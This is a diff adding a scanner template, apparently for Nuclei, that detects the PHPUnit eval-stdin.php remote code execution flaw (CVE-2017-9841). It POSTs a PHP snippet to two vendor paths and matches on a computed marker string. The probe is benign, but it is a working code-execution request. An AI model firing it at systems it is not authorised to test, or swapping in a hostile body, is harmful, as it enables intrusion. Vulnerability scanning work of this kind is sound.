@@ -1,0 +1,23 @@
+id: reconner-phpunit-eval-stdin-rce
+info:
+  name: PHPUnit eval-stdin remote code execution (CVE-2017-9841)
+  author: reconner
+  severity: critical
+  description: A reachable vendor/phpunit eval-stdin.php executes PHP from the request body. Confirmed by a computed arithmetic marker, so a hit is proven code execution, not a guess.
+  tags: reconner,cve,phpunit,rce,cve2017
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/vendor/phpunit/src/Util/PHP/eval-stdin.php"
+    body: "<?php echo 'rcn'.(8*9).'phpunit'; ?>"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "rcn72phpunit"
+      - type: status
+        status:
+          - 200
